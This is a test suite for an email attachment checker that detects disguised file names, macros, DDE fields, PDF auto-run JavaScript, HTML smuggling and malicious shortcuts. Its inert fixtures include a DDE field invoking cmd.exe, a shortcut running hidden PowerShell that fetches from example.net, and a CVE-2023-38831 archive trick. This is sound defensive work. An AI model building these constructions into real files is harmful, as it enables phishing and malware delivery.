// @ts-check
/**
 * @file Tests for the attachment checker: names, verdicts, and each kind of file it looks into.
 */
/**
 * Every fixture is built here from the format specifications (tests/build-files.mjs); nothing is a real sample and
 * nothing can run. Each kind of finding has a positive case, and ordinary files (photos, plain Office documents, a
 * PDF with a link) are checked not to rise above "nothing active found".
 */
import assert from 'node:assert/strict';
import { gzipSync } from 'node:zlib';
import { describe, it } from 'node:test';
import { MAX_DEEP, checkName, exampleFiles, inspectFile, nameMismatch, readLnk, verdictOf } from '../src/client/tool-attachment.mjs';
import { JPEG_STUB, PROGRAM_STUB, cfb, docx, iso, join, latin1, lnk, u16, u32, utf16le, utf8, zip } from './build-files.mjs';

/** @param {Uint8Array | string} data @param {string} name */
const check = (data, name) => inspectFile(new Blob([/** @type {Uint8Array<ArrayBuffer>} */ (typeof data === 'string' ? utf8(data) : data)]), name);
/** @param {import('../src/client/tool-attachment.mjs').FileReport} report */
const keys = (report) => report.findings.map((finding) => finding.key);
/** @param {import('../src/client/tool-attachment.mjs').FileReport} report @param {string} key */
const values = (report, key) => report.findings.find((finding) => finding.key === key)?.values ?? [];

describe('checkName', () => {
  it('writes out direction controls and shows what a right-to-left override makes the name look like', () => {
    const name = checkName('Invoice\u202efdp.exe');
    assert.equal(name.visible, 'Invoice⟨RLO⟩fdp.exe');
    assert.equal(name.shown, 'Invoiceexe.pdf');
    assert.equal(name.extension, 'exe');
    assert.equal(name.bidi, true);
  });

  it('finds double extensions and padding, and leaves ordinary names alone', () => {
    assert.equal(checkName('report.pdf.exe').bait, 'pdf');
    assert.equal(checkName('photo.jpg          .scr').padded, true);
    assert.equal(checkName('report.final.pdf').bait, '', 'a harmless last extension is not a trick');
    const georgian = checkName('ანგარიში 2026.docx');
    assert.deepEqual([georgian.bidi, georgian.bait, georgian.padded, georgian.extension], [false, '', false, 'docx']);
  });

  it('calls a name and content that disagree a mismatch, but not an unknown content', () => {
    assert.equal(nameMismatch('pdf', 'exe'), true);
    assert.equal(nameMismatch('pdf', 'pdf'), false);
    assert.equal(nameMismatch('pdf', 'unknown'), false);
    assert.equal(nameMismatch('weird', 'exe'), false);
  });
});

describe('verdictOf', () => {
  it('takes the most serious level, and "none" when there is only information', () => {
    /** @param {...import('../src/client/tool-attachment.mjs').Level} levels */
    const of = (...levels) => verdictOf(levels.map((level) => ({ key: 'webPage', level, values: [] })));
    assert.equal(of('locked', 'active', 'program', 'disguise'), 'program');
    assert.equal(of('locked', 'disguise', 'active'), 'disguise');
    assert.equal(of('locked', 'active'), 'active');
    assert.equal(of('locked'), 'locked');
    assert.equal(of('info'), 'none');
    assert.equal(of(), 'none');
  });
});

describe('inspectFile: programs and disguises', () => {
  it('says a program is a program, whatever its name, and shows how the name hides it', async () => {
    const report = await check(PROGRAM_STUB, 'Invoice\u202efdp.exe');
    assert.equal(report.kind, 'exe');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['program', 'bidi']);
    assert.deepEqual(values(report, 'bidi'), ['Invoice⟨RLO⟩fdp.exe', 'Invoiceexe.pdf']);
    const renamed = await check(PROGRAM_STUB, 'photo.jpg');
    assert.deepEqual(keys(renamed), ['program', 'mismatch']);
    assert.deepEqual(values(renamed, 'mismatch'), ['.jpg']);
  });

  it('knows scripts by their ending, which plain text does not reveal', async () => {
    const report = await check('var shell = new ActiveXObject("WScript.Shell");', 'invoice.pdf.js');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['riskyExtension', 'doubleExtension']);
    assert.deepEqual(values(report, 'doubleExtension'), ['.pdf', '.js']);
    assert.deepEqual(keys(await check('#!/bin/sh\necho hi\n', 'notes')), ['script']);
    const certificate = await check('-----BEGIN CERTIFICATE-----', 'bank.cer');
    assert.deepEqual([certificate.verdict, keys(certificate).join()], ['active', 'riskyOpen'], 'a certificate opens a prompt; it is not a program');
  });

  it('leaves ordinary files at "nothing active found"', async () => {
    for (const [data, name] of /** @type {[Uint8Array | string, string][]} */ ([[JPEG_STUB, 'photo.jpg'], ['Meeting at six.', 'notes.txt'], [docx(), 'letter.docx'], ['%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF\n', 'form.pdf']])) {
      const report = await check(data, name);
      assert.equal(report.verdict, 'none', name);
      assert.deepEqual(keys(report), [], name);
    }
  });

  it('checks only the name and type of a file over the size limit, and says so', async () => {
    const zeros = new Uint8Array(1024);
    const huge = /** @type {Blob} */ (/** @type {unknown} */ ({ size: MAX_DEEP + 1, slice: (/** @type {number} */ from, /** @type {number} */ to) => new Blob([zeros.subarray(0, Math.max(0, Math.min(to, from + 1024) - from))]) }));
    const report = await inspectFile(huge, 'backup.pdf.exe');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['riskyExtension', 'doubleExtension', 'tooLarge']);
  });
});

describe('inspectFile: archives', () => {
  it('checks each file inside and lifts the most serious verdict to the archive', async () => {
    const report = await check(zip([{ name: 'photos/beach.jpg', data: JPEG_STUB }, { name: 'invoice.pdf.exe', data: PROGRAM_STUB, deflate: true }]), 'documents.zip');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['insideProgram']);
    assert.deepEqual(values(report, 'insideProgram'), ['invoice.pdf.exe']);
    assert.deepEqual(report.inside, [{ name: 'photos/beach.jpg', kind: 'jpeg', verdict: 'none' }, { name: 'invoice.pdf.exe', kind: 'exe', verdict: 'program' }]);
    const photos = await check(zip([{ name: 'a.jpg', data: JPEG_STUB }, { name: 'b.jpg', data: JPEG_STUB }]), 'photos.zip');
    assert.equal(photos.verdict, 'none');
    assert.equal(photos.insideTotal, 2);
  });

  it('finds password-locked entries and the file-and-folder trick (CVE-2023-38831)', async () => {
    const locked = await check(zip([{ name: 'invoice.pdf', data: 'x', flags: 1 }]), 'invoice.zip');
    assert.equal(locked.verdict, 'locked');
    assert.ok(keys(locked).includes('encrypted'));
    const trick = await check(zip([{ name: 'report.pdf ', data: '%PDF-1.4' }, { name: 'report.pdf /report.pdf .cmd', data: 'calc' }]), 'report.zip');
    assert.ok(keys(trick).includes('zipSameName'));
    assert.equal(trick.verdict, 'program', 'and the .cmd inside is a script');
  });

  it('opens an archive inside an archive, but not a third level', async () => {
    const inner = zip([{ name: 'run.exe', data: PROGRAM_STUB }]);
    const two = await check(zip([{ name: 'inner.zip', data: inner }]), 'outer.zip');
    assert.deepEqual(two.inside.map((item) => `${item.name} ${item.verdict}`), ['inner.zip program', 'inner.zip/run.exe program']);
    const three = await check(zip([{ name: 'middle.zip', data: zip([{ name: 'inner.zip', data: inner }]) }]), 'outer.zip');
    assert.equal(three.verdict, 'locked');
    assert.deepEqual(values(three, 'insideLocked'), ['middle.zip']);
  });

  it('reads gzip and tar', async () => {
    const gz = await check(gzipSync(PROGRAM_STUB), 'setup.exe.gz');
    assert.deepEqual(gz.inside, [{ name: 'setup.exe', kind: 'exe', verdict: 'program' }]);
    const header = new Uint8Array(512);
    header.set(latin1('readme.txt'));
    header.set(latin1('0000000005\0'), 124);
    header[156] = 0x30;
    header.set(latin1('ustar\x0000'), 257);
    const tar = join(header, latin1('hello'), new Uint8Array(507), new Uint8Array(1024));
    assert.deepEqual((await check(tar, 'notes.tar')).inside, [{ name: 'readme.txt', kind: 'text', verdict: 'none' }]);
  });

  it('knows Android and Java apps by what is inside', async () => {
    const apk = await check(zip([{ name: 'AndroidManifest.xml', data: 'x' }, { name: 'classes.dex', data: 'dex' }]), 'whatsapp-update.apk');
    assert.deepEqual([apk.kind, apk.verdict, keys(apk).join()], ['apk', 'program', 'androidApp']);
    const jar = await check(zip([{ name: 'META-INF/MANIFEST.MF', data: 'Main-Class: A' }, { name: 'A.class', data: 'x' }]), 'tool.jar');
    assert.deepEqual([jar.kind, keys(jar).join()], ['jar', 'javaApp']);
  });
});

describe('inspectFile: Office and OpenDocument', () => {
  it('finds macros, macro sheets, ActiveX and DDE fields in Office Open XML', async () => {
    const [, , example] = exampleFiles();
    assert.deepEqual(keys(await inspectFile(example, example.name)), ['macros']);
    const noMacros = docx({ types: '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>' });
    assert.deepEqual(keys(await check(noMacros, 'plain.docm')), [], 'a .docm saved without macros has no macro part');
    const sheet = await check(docx({ types: '<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>' }), 'a.docx');
    assert.deepEqual(keys(sheet), ['macroSheet']);
    const control = await check(docx({ rels: '<Relationship Id="r9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/>' }), 'a.docx');
    assert.deepEqual(keys(control), ['activeX']);
    // A DDE field split over several runs, as attackers write it to hide the word.
    const field = '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
    assert.deepEqual(keys(await check(docx({ body: field }), 'a.docx')), ['dde']);
  });

  it('finds remote templates and objects, and lists ordinary links for the link checker', async () => {
    const rels = '<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://192.0.2.10/t.dotm" TargetMode="External"/><Relationship Id="r2" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/hyperlink" Target="https://example.com/page" TargetMode="External"/>';
    const report = await check(docx({ rels }), 'cv.docx');
    assert.deepEqual(keys(report), ['remote']);
    assert.deepEqual(values(report, 'remote'), ['https://192.0.2.10/t.dotm']);
    assert.deepEqual(report.links.map((link) => link.url), ['https://example.com/page']);
  });

  it('flags OLE objects but checks embedded Office files like any file inside', async () => {
    const workbook = zip([{ name: '[Content_Types].xml', data: '<Types/>' }, { name: 'xl/workbook.xml', data: '<workbook/>' }]);
    const chart = await check(docx({ parts: [{ name: 'word/embeddings/Microsoft_Excel_Worksheet.xlsx', data: workbook }] }), 'chart.docx');
    assert.equal(chart.verdict, 'none');
    assert.equal(chart.insideTotal, 1);
    const ole = await check(docx({ parts: [{ name: 'word/embeddings/oleObject1.bin', data: cfb([{ path: '\u0001Ole10Native', data: PROGRAM_STUB }]) }] }), 'a.docx');
    assert.deepEqual(values(ole, 'embedded'), ['oleObject1.bin']);
  });

  it('finds OpenDocument macros and encryption', async () => {
    const odt = (/** @type {import('./build-files.mjs').ZipItem[]} */ ...parts) => zip([{ name: 'mimetype', data: 'application/vnd.oasis.opendocument.text' }, { name: 'content.xml', data: '<office:document-content/>' }, ...parts]);
    assert.deepEqual(keys(await check(odt(), 'a.odt')), []);
    assert.deepEqual(keys(await check(odt({ name: 'Basic/Standard/script-lb.xml', data: 'x' }), 'a.odt')), [], 'an empty library is not a macro');
    assert.deepEqual(keys(await check(odt({ name: 'Basic/Standard/Module1.xml', data: 'Sub Main' }), 'a.odt')), ['macros']);
    assert.deepEqual(keys(await check(odt({ name: 'META-INF/manifest.xml', data: '<manifest:encryption-data manifest:checksum="x"/>' }), 'a.odt')), ['encrypted']);
  });

  it('reads compound files: Word macros, Excel 4.0 macro sheets and very hidden sheets, encryption, installers', async () => {
    const word = await check(cfb([{ path: 'WordDocument', data: latin1('x') }, { path: 'Macros/VBA/dir', data: latin1('x') }]), 'letter.doc');
    assert.deepEqual([word.kind, keys(word).join()], ['doc', 'macros']);
    // BoundSheet8 (0x0085): position (4 bytes), visibility 2 (very hidden), type 1 (macro sheet), name; then EOF.
    const workbook = join(u16(0x0085), u16(8), u32(0), [2, 1], [1, 0], latin1('M'), u16(0x000a), u16(0));
    const excel = await check(cfb([{ path: 'Workbook', data: workbook }]), 'prices.xls');
    assert.deepEqual([excel.kind, keys(excel).join()], ['xls', 'veryHidden,macroSheet']);
    const locked = await check(cfb([{ path: 'EncryptionInfo', data: latin1('x') }, { path: 'EncryptedPackage', data: latin1('y') }]), 'salary.xlsx');
    assert.deepEqual([locked.kind, keys(locked).join()], ['officeLocked', 'encrypted']);
    const installer = await check(cfb([{ path: 'x', data: latin1('1') }], { rootClsid: [0x84, 0x10, 0x0c, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46] }), 'update.msi');
    assert.deepEqual([installer.kind, keys(installer).join()], ['msi', 'installer']);
  });

  it("checks an Outlook message's attachments", async () => {
    const message = cfb([
      { path: '__properties_version1.0', data: new Uint8Array(32) },
      { path: '__attach_version1.0_#00000000/__substg1.0_3707001F', data: utf16le('statement.pdf.exe') },
      { path: '__attach_version1.0_#00000000/__substg1.0_37010102', data: PROGRAM_STUB },
    ]);
    const report = await check(message, 'Statement.msg');
    assert.equal(report.kind, 'msg');
    assert.deepEqual(report.inside, [{ name: 'statement.pdf.exe', kind: 'exe', verdict: 'program' }]);
  });

  it('finds RTF objects that load by themselves, and the old Equation Editor', async () => {
    // OLE 1.0 header: version, format 2 (embedded), class name length 11, "Equation.3\0".
    // OLE 1.0 embedded object (MS-OLEDS §2.2.4): version, format 2, class name, empty topic and item, native data.
    const header = join(u32(0x0501), u32(2), u32(11), latin1('Equation.3\0'), u32(0), u32(0), u32(4), latin1('data'));
    const hex = Array.from(header, (byte) => byte.toString(16).padStart(2, '0')).join('');
    const rtf = `{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata ${hex}}}}`;
    const report = await check(rtf, 'cv.rtf');
    assert.deepEqual(keys(report), ['embedded', 'autoUpdate', 'equationEditor']);
    assert.deepEqual(values(report, 'embedded'), ['Equation.3']);
  });
});

describe('inspectFile: PDF', () => {
  /** @param {string} body */
  const pdf = (body) => `%PDF-1.7\n${body}\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n`;

  it('finds JavaScript that runs when the document opens, also when its names are escaped', async () => {
    const plain = await check(pdf('1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj'), 'a.pdf');
    assert.deepEqual(keys(plain), ['pdfJavaScript', 'pdfAutoAction']);
    const escaped = await check(pdf('1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n2 0 obj\n<< /S /Java#53cript /#4A#53 (x) >>\nendobj'), 'a.pdf');
    assert.deepEqual(keys(escaped), ['pdfObfuscated', 'pdfJavaScript', 'pdfAutoAction']);
    assert.deepEqual(values(escaped, 'pdfObfuscated'), ['/JavaScript', '/JS']);
    const tree = await check(pdf('1 0 obj\n<< /Type /Catalog /Names << /JavaScript 3 0 R >> >>\nendobj\n3 0 obj\n<< /Names [(a) 4 0 R] >>\nendobj\n4 0 obj\n<< /S /JavaScript /JS (x) >>\nendobj'), 'a.pdf');
    assert.ok(keys(tree).includes('pdfAutoAction'), 'the document-level JavaScript name tree runs on opening');
  });

  it('finds launch actions and forms that send what is typed', async () => {
    const launch = await check(pdf('1 0 obj\n<< /Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >> >>\nendobj'), 'a.pdf');
    assert.deepEqual(values(launch, 'pdfLaunch'), ['cmd.exe']);
    const submit = await check(pdf('1 0 obj\n<< /S /SubmitForm /F << /FS /URL /F (https://collect.example/) >> >>\nendobj'), 'a.pdf');
    assert.ok(keys(submit).includes('pdfSubmit'));
  });

  it('lists links for the link checker without calling them active', async () => {
    const report = await check(pdf('1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://192.0.2.7/login) >> >>\nendobj'), 'statement.pdf');
    assert.equal(report.verdict, 'none');
    assert.equal(report.links.length, 1);
    assert.ok(report.links[0].warnings > 0, 'an address that is a bare IP number gets a warning');
  });

  it('checks attached files', async () => {
    const body = `1 0 obj\n<< /Type /Filespec /F (invoice.exe) /EF << /F 2 0 R >> >>\nendobj\n2 0 obj\n<< /Type /EmbeddedFile /Length ${PROGRAM_STUB.length} >>\nstream\n${String.fromCharCode(...PROGRAM_STUB)}\nendstream\nendobj`;
    const report = await check(latin1(pdf(body)), 'scan.pdf');
    assert.deepEqual(values(report, 'pdfAttachments'), ['invoice.exe']);
    assert.deepEqual(report.inside, [{ name: 'invoice.exe', kind: 'exe', verdict: 'program' }]);
    assert.equal(report.verdict, 'program');
  });
});

describe('inspectFile: web pages', () => {
  it('finds a password form, where it sends what is typed, and judges the page links', async () => {
    const [, page] = exampleFiles();
    const report = await inspectFile(page, page.name);
    assert.equal(report.verdict, 'active');
    assert.deepEqual(keys(report), ['passwordForm', 'webPage']);
    assert.deepEqual(values(report, 'passwordForm'), ['https://parcel-delivery-notice.example/login']);
    assert.deepEqual(report.links.map((link) => link.site), ['parcel-delivery-notice.example']);
  });

  it('finds scripts, redirects and files smuggled inside the page', async () => {
    const smuggler = '<html><body onload="go()"><script>var b = new Blob([atob("TVqQAAMAAAAEAAAA")]); var a = document.createElement("a"); a.download = "invoice.iso";</script></body></html>';
    assert.deepEqual(keys(await check(smuggler, 'voice message.html')), ['pageScript', 'smuggling', 'webPage']);
    const redirect = await check('<html><head><meta http-equiv="refresh" content="0; url=https://login.example.net/"></head></html>', 'a.htm');
    assert.deepEqual(values(redirect, 'refresh'), ['https://login.example.net/']);
    assert.equal(redirect.links.length, 1);
  });

  it('treats SVG with scripts or a page inside as active', async () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div xmlns="http://www.w3.org/1999/xhtml">Sign in</div></foreignObject><a href="javascript:go()"><text>Open</text></a></svg>';
    assert.deepEqual(keys(await check(svg, 'invoice.svg')), ['pageScript', 'foreignObject', 'svgPage']);
    assert.deepEqual(keys(await check('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>', 'logo.svg')), ['svgPage']);
  });
});

describe('inspectFile: shortcuts, profiles and disk images', () => {
  it('shows what a Windows shortcut runs', async () => {
    const bytes = lnk('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-w hidden -c iwr https://example.net/a');
    assert.deepEqual(readLnk(bytes), { target: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', arguments: '-w hidden -c iwr https://example.net/a', workingDir: '' });
    const report = await check(bytes, 'Document.pdf.lnk');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['shortcut', 'doubleExtension']);
    assert.deepEqual(values(report, 'shortcut'), ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c iwr https://example.net/a']);
  });

  it('shows where internet shortcuts and Windows library files lead, including a remote working folder', async () => {
    const url = await check('[InternetShortcut]\r\nURL=https://example.org/doc\r\nWorkingDirectory=\\\\192.0.2.5@SSL\\share\r\n', 'doc.url');
    assert.deepEqual(keys(url), ['shortcut', 'remoteFolder']);
    assert.deepEqual(values(url, 'remoteFolder'), ['\\\\192.0.2.5@SSL\\share']);
    assert.equal(url.links.length, 1);
    const library = await check('<?xml version="1.0"?>\n<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"><searchConnectorDescriptionList><searchConnectorDescription><simpleLocation><url>\\\\192.0.2.5\\files</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>', 'Documents.library-ms');
    assert.deepEqual(values(library, 'shortcut'), ['\\\\192.0.2.5\\files']);
  });

  it('lists what an Apple configuration profile sets up, signed or not', async () => {
    const plist = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist><plist version="1.0"><dict><key>PayloadContent</key><array><dict><key>PayloadType</key><string>com.apple.vpn.managed</string></dict><dict><key>PayloadType</key><string>com.apple.security.root</string></dict><dict><key>PayloadType</key><string>com.example.thing</string></dict></array><key>PayloadType</key><string>Configuration</string></dict></plist>';
    const report = await check(plist, 'Free WiFi.mobileconfig');
    assert.deepEqual([report.verdict, values(report, 'profile').join()], ['program', 'vpn,certificate,other']);
    // A signed profile is DER-encoded CMS with the XML inside.
    const signed = await check(join([0x30, 0x80, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02, 0xa0, 0x80], utf8(plist), [0, 0]), 'Free WiFi.mobileconfig');
    assert.deepEqual([signed.kind, values(signed, 'profile').join()], ['mobileconfig', 'vpn,certificate,other']);
  });

  it('lists an ISO image, with its hidden files', async () => {
    const image = iso([{ name: 'INVOICE.LNK;1', data: lnk('C:\\Windows\\System32\\rundll32.exe', 'data.dll,Start') }, { name: 'DATA.DLL;1', data: PROGRAM_STUB, hidden: true }, { name: 'README.TXT;1', data: latin1('hello') }]);
    const report = await check(image, 'invoice.iso');
    assert.equal(report.verdict, 'program');
    assert.deepEqual(keys(report), ['insideProgram', 'hiddenFiles', 'diskImage']);
    assert.deepEqual(values(report, 'hiddenFiles'), ['DATA.DLL']);
    assert.deepEqual(report.inside.map((item) => `${item.name} ${item.kind} ${item.verdict}`), ['INVOICE.LNK lnk program', 'DATA.DLL exe program', 'README.TXT text none']);
  });

  it("says when it can't look inside", async () => {
    const vhd = new Uint8Array(4096);
    vhd.set(latin1('conectix'), 4096 - 512);
    assert.deepEqual(keys(await check(vhd, 'disk.vhd')), ['diskImage', 'cantList']);
    assert.deepEqual(keys(await check(join(latin1('Rar!'), [0x1a, 0x07, 0x01, 0x00], new Uint8Array(32)), 'files.rar')), ['cantList']);
  });
});

describe('inspectFile on damaged files', () => {
  it('never throws on a file cut short at any point', async () => {
    const message = cfb([{ path: '__properties_version1.0', data: new Uint8Array(32) }, { path: '__attach_version1.0_#00000000/__substg1.0_37010102', data: PROGRAM_STUB }]);
    const files = [
      [zip([{ name: 'a.exe', data: PROGRAM_STUB, deflate: true }]), 'a.zip'],
      [docx({ body: '<w:p/>' }), 'a.docx'],
      [message, 'a.msg'],
      [iso([{ name: 'A.EXE;1', data: PROGRAM_STUB }]), 'a.iso'],
      [lnk('C:\\a.exe', 'x'), 'a.lnk'],
      [latin1('%PDF-1.7\n1 0 obj\n<< /OpenAction << /S /JavaScript /JS (x) >> >>\nendobj\n'), 'a.pdf'],
    ];
    for (const [data, name] of /** @type {[Uint8Array, string][]} */ (files)) {
      for (let cut = 1; cut < data.length; cut += Math.max(1, Math.floor(data.length / 40))) {
        const report = await check(data.subarray(0, cut), name);
        assert.ok(['program', 'disguise', 'active', 'locked', 'none'].includes(report.verdict), `${name} cut at ${cut}`);
      }
    }
  });
});
